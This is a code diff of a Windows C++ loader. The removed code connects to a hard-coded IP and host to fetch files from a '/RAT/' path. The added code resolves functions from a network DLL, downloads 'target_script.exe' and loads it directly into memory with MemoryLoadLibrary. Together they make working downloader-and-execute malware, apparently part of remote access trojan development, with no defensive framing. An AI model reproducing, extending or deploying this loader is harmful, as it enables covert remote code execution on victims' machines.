@@ -1,157 +1,61 @@
-#include <winsock2.h>
+//cl /EHsc .\s3.cpp .\MemoryModule.c /link /OUT:s3.exe
 #include <windows.h>
 #include <iostream>
-#include <string>
 #include <vector>
-#include <mutex>
+#include "MemoryModule.h"
 
-SOCKET clientSocket;
-std::mutex socketMutex; 
+LPCSTR dllPath_n = "network_lib.dll";
 
-std::vector<unsigned char> receive_data_raw(const std::string &filename);
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef std::string (*RecvDataFunc)(const std::string&);
+typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+RecvDataRawFunc receive_data_raw;
+
+void* FindExportAddress(HMODULE hModule, const char* funcName)
+{
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
+    {
+        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
+        if (strcmp(funcNameFromExport, funcName) == 0)
+        {
+            DWORD funcRVA = funcRVAs[ordRVAs[i]];
+            return (void*)((BYTE*)hModule + funcRVA);
+        }
+    }
+    std::cout << "Failed to find export address of: " << funcName << std::endl;
+    return nullptr;
+}
+
+void load_dll()                                             
+{
+    HMODULE N_dll = LoadLibraryA("network_lib.dll");
+    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
+
+    receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
+    receive_data = (RecvDataFunc)FindExportAddress(N_dll, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    
+    if (receive_data_raw == nullptr || send_data == nullptr || receive_data == nullptr) std::cerr << "Failed to find export address of one or more functions." << std::endl;
+}
 
 int main()
 {
-    std::vector<unsigned char> a = receive_data_raw("target_enum.rat");
-    for(unsigned char c : a) std::cout << c;
+    load_dll();
+    std::vector <unsigned char> a;
 
+    a = receive_data_raw("target_script.exe");
+    MemoryLoadLibrary(a.data(), a.size());
 
     return 0;
-}
-
-int safe_closesocket(SOCKET &clientSocket)
-{
-    if (clientSocket != INVALID_SOCKET)
-    {
-        shutdown(clientSocket, SD_BOTH);
-        closesocket(clientSocket);
-
-        clientSocket = INVALID_SOCKET;
-        return 0;
-    }
-    else return 1;
-}
-
-int socket_setup(SOCKET &clientSocket)
-{
-    bool connected = false;
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-    {
-        std::cerr << "WSAStartup failed.\n";
-        return 0;
-    }
-
-    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (clientSocket == INVALID_SOCKET)
-    {
-        std::cerr << "socket failed.\n";
-        WSACleanup();
-        return 0;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(80);
-    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
-
-    while (!connected)
-    {
-        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            if (error != WSAECONNREFUSED)
-            {
-                std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
-            }   
-            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-            Sleep(2000);
-        }
-        else connected = true;
-
-    }
-    return 1;
-}
-
-std::vector<unsigned char> receive_data_raw(const std::string &filename)
-{
-    std::lock_guard<std::mutex> lock1(socketMutex);
-
-    socket_setup(clientSocket);
-
-    // Send HTTP GET request
-    std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
-    httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
-
-    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
-    {
-        int error = WSAGetLastError();
-        std::cerr << "Send failed with error: " << error << std::endl;
-        throw std::runtime_error("Send failed");
-    }
-
-    // Receive data in chunks
-    char buffer[8192]; // Increased buffer size
-    std::vector<unsigned char> receivedData;
-    int bytesReceived;
-
-    do {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-        if (bytesReceived > 0) {
-            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
-        } else if (bytesReceived == 0) {
-            //std::cerr << "Connection closed by server." << std::endl;
-            break;
-        } else {
-            int error = WSAGetLastError();
-            std::cerr << "Receive failed with error: " << error << std::endl;
-            break;
-        }
-    } while (bytesReceived > 0);
-
-    // Ensure header separator is found
-    size_t headerEnd = 0;
-    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};
-
-    // Search for header separator (CRLF + CRLF)
-    for (size_t i = 0; i < receivedData.size() - 3; ++i)
-    {
-        if (receivedData[i] == CRLF[0] &&
-            receivedData[i + 1] == CRLF[1] &&
-            receivedData[i + 2] == CRLF[2] &&
-            receivedData[i + 3] == CRLF[3])
-        {
-            headerEnd = i + 4; // Found header, skip the separator
-            break;
-        }
-    }
-
-    if (headerEnd != 0)
-    {
-        //cout << "Header found at position: " << headerEnd << std::endl;
-    }
-    else
-    {
-        std::cerr << "Header separator not found." << std::endl;
-        throw std::runtime_error("Header separator not found");
-    }
-
-    // Make sure headerEnd + 4 is within the bounds of the receivedData
-    if (headerEnd < receivedData.size())
-    {
-        // Extract body after header (start from headerEnd)
-        std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
-        safe_closesocket(clientSocket); // Close the socket safely
-
-        return body; // Return the extracted body
-    }
-    else
-    {
-        std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
-        safe_closesocket(clientSocket); // Close the socket safely
-        throw std::runtime_error("Body extraction failed");
-    }
 }
